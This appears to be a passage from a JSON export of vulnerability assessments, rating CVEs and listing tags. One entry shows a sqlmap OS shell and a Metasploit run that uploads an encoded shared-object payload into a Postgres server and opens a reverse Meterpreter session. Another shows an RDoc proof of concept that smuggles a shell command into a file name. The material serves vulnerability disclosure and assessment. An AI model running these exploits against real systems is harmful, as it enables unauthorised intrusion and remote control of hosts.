Nmap 7.91 ( https://nmap.org ) at 2021-04-29 17:13 CDT\r\nNSE: Loaded 1 scripts for scanning.\r\nNSE: Script Pre-scanning.\r\nInitiating NSE at 17:13\r\nCompleted NSE at 17:13, 0.00s elapsed\r\nInitiating Connect Scan at 17:13\r\nScanning 192.168.123.133 [1 port]\r\nDiscovered open port 5029/tcp on 192.168.123.133\r\nCompleted Connect Scan at 17:13, 0.00s elapsed (1 total ports)\r\nNSE: Script scanning 192.168.123.133.\r\nInitiating NSE at 17:13\r\nCompleted NSE at 17:13, 0.01s elapsed\r\nNmap scan report for 192.168.123.133\r\nHost is up (0.00073s latency).\r\n\r\nPORT     STATE SERVICE\r\n5029/tcp open  infobright\r\n| pgsql-brute:\r\n|_  postgres => Trusted authentication\r\n\r\nNSE: Script Post-scanning.\r\nInitiating NSE at 17:13\r\nCompleted NSE at 17:13, 0.00s elapsed\r\nRead data files from: /usr/local/bin/../share/nmap\r\nNmap done: 1 IP address (1 host up) scanned in 0.21 seconds\r\nwvu@kharak:~$\r\n```\r\n\r\n## Exploit\r\n\r\n```\r\nwvu@kharak:~$ sqlmap -d postgresql://postgres:CVE-2021-20020@192.168.123.133:5029/postgres --os-shell\r\n[snip]\r\nos-shell> id\r\n[19:13:28] [INFO] resumed: [[u'uid=104(postgres) gid=104(postgres) groups=104(postgres)']]...\r\ncommand standard output: 'uid=104(postgres) gid=104(postgres) groups=104(postgres)'\r\nos-shell> uname -a\r\n[19:13:29] [INFO] resumed: [[u'Linux gms.example.com 3.18.44-snwl-VMWare-x64 #1 SMP Tue Jan 5 20:04:11 PST 2021 x86_64 GNU/Linux']]...\r\ncommand standard output: 'Linux gms.example.com 3.18.44-snwl-VMWare-x64 #1 SMP Tue Jan 5 20:04:11 PST 2021 x86_64 GNU/Linux'\r\nos-shell>\r\n```\r\n\r\n```\r\nmsf6 exploit(linux/postgres/postgres_payload) > run\r\n\r\n[*] Started reverse TCP handler on 192.168.123.1:4444\r\n[*] Trying postgres:CVE-2021-20020@192.168.123.133:5029/postgres\r\n[*] 192.168.123.133:5029 Postgres - querying with 'select version()'\r\n[*] 192.168.123.133:5029 - PostgreSQL 9.2.2 (IB_33928), shared on x86_64-unknown-linux-gnu, compiled by gcc (GCC) 4.1.2 20080704 (Red Hat 4.1.2-44), 64-bit\r\n[*] 192.168.123.133:5029 Postgres - querying with 'select lo_creat(-1)'\r\n[*] 192.168.123.133:5029 Postgres - querying with 'delete from pg_largeobject where loid=16556'\r\n[*] 192.168.123.133:5029 Postgres - querying with 'insert into pg_largeobject (loid,pageno,data) values(16556, 0, decode('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', 'base64'))'\r\n[*] 192.168.123.133:5029 Postgres - querying with 'insert into pg_largeobject (loid,pageno,data) values(16556, 1, decode('sAMAAAAAAACwAwAAAAAAAFoAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAQgAAAAEAAAADAAAAAAAAABAUAAAAAAAAEAQAAAAAAACDAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAEAAAAGAAAAAwAAAAAAAACgFAAAAAAAAKAEAAAAAAAAAAEAAAAAAAACAAAAAAAAABAAAAAAAAAAEAAAAAAAAABIAAAADgAAAAMAAAAAAAAAoBUAAAAAAACgBQAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAVAAAAAEAAAADAAAAAAAAAKgVAAAAAAAAqAUAAAAAAABIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAF0AAAADAAAAAAAAAAAAAAAAAAAAAAAAAHAJAAAAAAAAZwAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAALmR5bmFtaWMALnJvZGF0YQAuZHluc3RyAC5oYXNoAC5yZWxhLnBsdAAucmVsYS5keW4ALmR5bnN5bQAudGV4dAAuZGF0YQAuaW5pdF9hcnJheQAuZ290LnBsdAAuc2hzdHJ0YWIA', 'base64'))'\r\n[*] 192.168.123.133:5029 Postgres - querying with 'select lo_export(16556, '/tmp/LioDnmLR.so')'\r\n[*] Uploaded as /tmp/LioDnmLR.so, should be cleaned up automatically\r\n[*] 192.168.123.133:5029 Postgres - querying with 'create or replace function pg_temp.fyUNIYwYUo() returns void as '/tmp/LioDnmLR.so','fyUNIYwYUo' language c strict immutable'\r\n[*] 192.168.123.133:5029 Postgres - Disconnected\r\n[*] Transmitting intermediate stager...(126 bytes)\r\n[*] Sending stage (3012548 bytes) to 192.168.123.133\r\n[*] Meterpreter session 1 opened (192.168.123.1:4444 -> 192.168.123.133:50512) at 2021-04-30 14:17:03 -0500\r\n\r\nmeterpreter > getuid\r\nServer username: postgres @ gms.example.com (uid=104, gid=104, euid=104, egid=104)\r\nmeterpreter > sysinfo\r\nComputer     : gms.example.com\r\nOS           :  (Linux 3.18.44-snwl-VMWare-x64)\r\nArchitecture : x64\r\nBuildTuple   : x86_64-linux-musl\r\nMeterpreter  : x64/linux\r\nmeterpreter >\r\n```",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "d8680623-4816-49f2-965f-2ae7efc10bea",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "68a73d22-2393-46f2-acf6-868546f68e29",
      "created": "2021-05-03T01:43:22.911052Z",
      "revisionDate": "2021-05-10T13:16:02.705496Z",
      "document": "# CVE-2021-31799\r\n\r\nPerlisms [strike again](https://perldoc.perl.org/functions/open#Opening-a-filehandle-into-a-command) in this [RDoc command injection](https://www.ruby-lang.org/en/news/2021/05/02/os-command-injection-in-rdoc/). `Kernel#open` is [not safe](https://apidock.com/ruby/Kernel/open).\r\n\r\n## Patch\r\n\r\nFile is `lib/rdoc/rdoc.rb`.\r\n\r\n```diff\r\n   ##\r\n   # Removes file extensions known to be unparseable from +files+ and TAGS\r\n   # files for emacs and vim.\r\n\r\n   def remove_unparseable files\r\n     files.reject do |file, *|\r\n       file =~ /\\.(?:class|eps|erb|scpt\\.txt|svg|ttf|yml)$/i or\r\n         (file =~ /tags$/i and\r\n-         open(file, 'rb') { |io|\r\n+         File.open(file, 'rb') { |io|\r\n            io.read(100) =~ /\\A(\\f\\n[^,]+,\\d+$|!_TAG_)/\r\n          })\r\n     end\r\n   end\r\n```\r\n\r\n## PoC\r\n\r\n```\r\nwvu@kharak:~/Downloads/poc$ cat vulnerable\r\ncat: vulnerable: No such file or directory\r\nwvu@kharak:~/Downloads/poc$ touch \"| echo HACK THE PLANET > vulnerable # tags\"\r\nwvu@kharak:~/Downloads/poc$ rdoc\r\nParsing sources...\r\n100% [ 1/ 1]  | echo HACK THE PLANET > vulnerable # tags\r\n\r\nGenerating Darkfish format into /Users/wvu/Downloads/poc/doc...\r\n\r\n  Files:      1\r\n\r\n  Classes:    0 (0 undocumented)\r\n  Modules:    0 (0 undocumented)\r\n  Constants:  0 (0 undocumented)\r\n  Attributes: 0 (0 undocumented)\r\n  Methods:    0 (0 undocumented)\r\n\r\n  Total:      0 (0 undocumented)\r\n    0.00% documented\r\n\r\n  Elapsed: 0.1s\r\n\r\nwvu@kharak:~/Downloads/poc$ cat vulnerable\r\nHACK THE PLANET\r\nwvu@kharak:~/Downloads/poc$\r\n```",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "80608641-f70a-4427-b623-1d0520fea7ba",
      "editorId": "d20dbd39-7fbf-48f1-a75e-1d1af7c12d0a",
      "topicId": "7c5703d3-9e18-4f5c-a4d2-25e1f09b43cb",
      "created": "2021-05-03T20:58:17.054429Z",
      "revisionDate": "2021-05-03T20:58:17.060315Z",
      "document": "",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "bf30aad1-2b0a-454c-b552-57c95064fd59",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "d9826725-69ea-420f-9ab1-f16e3f0fdd68",
      "created": "2021-05-05T07:09:42.590466Z",
      "revisionDate": "2022-07-25T19:23:25.29646Z",
      "document": "Not sure this is [the vuln](https://www.qnap.com/en-us/security-advisory/qsa-21-05) (and I can't test it), but it stood out to me because the `exec_mount()` function no longer calls `popen(3)`... or much of anything else:\r\n\r\n```diff\r\n int32_t exec_mount(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {\r\n-    int32_t str3;\r\n-    memset(&str3, 0, (int32_t)&g2);\r\n-    int32_t str4;\r\n-    memset(&str4, 0, (int32_t)&g1);\r\n-    sprintf((char *)&str3, \"mount.cifs -o \\\"username=%s,password=\\\"%s\\\",soft,iocharset=utf8,%s%s\\\" %s %s 2>&1\", (char *)a3, (char *)a4, (char *)a5, (char *)a6, (char *)a1, (char *)a2);\r\n-    struct _IO_FILE * stream = popen((char *)&str3, \"r\");\r\n-    char * str = fgets((char *)&str4, (int32_t)&g265, stream);\r\n-    int32_t result = 0;\r\n-    if (str != NULL) {\r\n-        while (strstr((char *)&str4, (char *)((int32_t)&g177 + 0x109d4)) == NULL) {\r\n-            char * str2 = fgets((char *)&str4, (int32_t)&g265, stream);\r\n-            result = -1;\r\n-            if (str2 == NULL) {\r\n-                goto lab_0x10a14;\r\n-            }\r\n-        }\r\n-        char * found_char_pos = strchr((char *)&str4, 40);\r\n-        result = -13;\r\n-        if (found_char_pos != NULL) {\r\n-            char * str5 = (char *)((int32_t)found_char_pos + 1);\r\n-            *strchr(str5, 41) = 0;\r\n-            sscanf(str5, \"%d\");\r\n-            result = -1;\r\n-        }\r\n-    }\r\n-  lab_0x10a14:\r\n-    if (stream != NULL) {\r\n-        pclose(stream);\r\n-    }\r\n-    return result;\r\n+    int32_t str;\r\n+    memset(&str, 0, (int32_t)&g2);\r\n+    sprintf((char *)&str, \"mount.cifs -o \\\"username=%s,password=\\\"%s\\\",soft,iocharset=utf8,%s%s\\\" %s %s 2>&1\", (char *)a3, (char *)a4, (char *)a5, (char *)a6, (char *)a1, (char *)a2);\r\n+    return 0;\r\n }\r\n```\r\n\r\nThe `CIFS_Mount_Speed()` function no longer calls `system(3)` either:\r\n\r\n```diff\r\n int32_t CIFS_Mount_Speed(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {\r\n     int32_t str;\r\n     memset(&str, 0, (int32_t)&g1);\r\n     int32_t str2;\r\n-    memset(&str2, 0, (int32_t)&g83);\r\n+    memset(&str2, 0, (int32_t)&g82);\r\n     int32_t v1 = 0;\r\n     int32_t v2;\r\n-    memset(&v2, 0, (int32_t)&g80);\r\n+    memset(&v2, 0, (int32_t)&g79);\r\n     int32_t v3;\r\n     memset(&v3, 0, 128);\r\n     int32_t v4;\r\n     function_3a18((int32_t)((char)v4 == 47) + a2, &v1);\r\n     int32_t v5;\r\n     function_3a18(a3, &v5);\r\n     function_3a18(a4, &v3);\r\n     char * v6 = (char *)a1;\r\n     sprintf((char *)&str, \"//%s/%s\", v6, &v1);\r\n     sprintf((char *)&str2, \"%s/%s/%s/%s\", \"/mnt/RTRR_CIFS\", v6, &v3, &v1);\r\n     int32_t str3;\r\n     sprintf((char *)&str3, \"mkdir -p %s\", &str2);\r\n-    system((char *)&str3);\r\n     int32_t v7;\r\n-    memcpy(&v7, (int32_t *)((int32_t)&g169 + 0x10bb0), (int32_t)&g90);\r\n+    memcpy(&v7, (int32_t *)((int32_t)&g158 + 0x10a7c), (int32_t)&g89);\r\n     int32_t v8;\r\n-    memcpy(&v8, (int32_t *)((int32_t)&g169 + 0x10df0), 128);\r\n+    memcpy(&v8, (int32_t *)((int32_t)&g158 + 0x10cbc), 128);\r\n     int32_t v9 = &v7;\r\n     int32_t v10 = function_3e20(&str, &str2, a4, &v5, v9, &v8);\r\n     int32_t result = 0;\r\n     while (v10 != 0) {\r\n         int32_t v11;\r\n         int32_t v12 = function_3e20(&str, &str2, a4, &v5, v9, &v11);\r\n         result = 0;\r\n         if (v12 == 0) {\r\n             break;\r\n         }\r\n         v9 += 64;\r\n         if (v9 == (int32_t)&v5) {\r\n             result = -v12;\r\n             return result;\r\n         }\r\n         v10 = function_3e20(&str, &str2, a4, &v5, v9, &v8);\r\n         result = 0;\r\n     }\r\n-  lab_0x10c7c:\r\n+  lab_0x10b6c:\r\n     return result;\r\n }\r\n```\r\n\r\n`function_3e20()` above is actually `exec_mount()`. Sorry about that.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "9dadca92-2d66-462c-b789-51b90359dea9",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "b86c17ff-b8f9-4aed-8b70-182c2603c527",
      "created": "2021-05-06T17:47:48.830644Z",
      "revisionDate": "2021-05-12T21:34:39.306697Z",
      "document": "As per [SentinelLabs' blog post](https://labs.sentinelone.com/cve-2021-21551-hundreds-of-millions-of-dell-computers-at-risk-due-to-multiple-bios-driver-privilege-escalation-flaws/):\r\n\r\n> * SentinelLabs has discovered five high severity flaws in Dell\u2019s firmware update driver impacting Dell desktops, laptops, notebooks and tablets.\r\n> * Attackers may exploit these vulnerabilities to locally escalate to kernel-mode privileges.\r\n> * Since 2009, Dell has released hundreds of millions of Windows devices worldwide which contain the vulnerable driver.\r\n> * SentinelLabs findings were proactively reported to Dell on Dec 1, 2020 and are tracked as CVE-2021-21551, marked with CVSS Score 8.8.\r\n> * Dell has released a security update to its customers to address this vulnerability.\r\n> * At this time, SentinelOne has not discovered evidence of in-the-wild abuse.\r\n\r\nI expect this to be a long-lived LPE, since it affects so many devices, exploitation is straightforward, and patching is somewhat inconvenient.\r\n\r\n**ETA:** @smcintyre-r7 has written an [exploit](https://github.com/rapid7/metasploit-framework/pull/15190) for CVE-2021-21551.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "96ad5b08-aac5-48fa-bf04-f7628af1c380",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "28d6a5e1-da51-4967-af7f-e98061a68eb3",
      "created": "2021-05-08T19:26:05.711697Z",
      "revisionDate": "2021-05-10T20:37:41.379801Z",
      "document": "This is just a security bypass allowing an attacker to perform a brute-force attack on the authentication form without being blocked after 10 attemps.\r\nSo 9.8 CVSS score is way too high for this vuln.",
      "score": 3,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        }
      ]
    },
    {
      "id": "024d9d11-2bd1-4733-b129-0f7f14d19244",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "de7a08c2-b9c9-4036-a7ad-f68885ecf37f",
      "created": "2021-05-08T19:33:52.238349Z",
      "revisionDate": "2021-05-10T20:37:35.99062Z",
      "document": "Unauthenticated RCE with default config, this is critical.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    }
  ]
}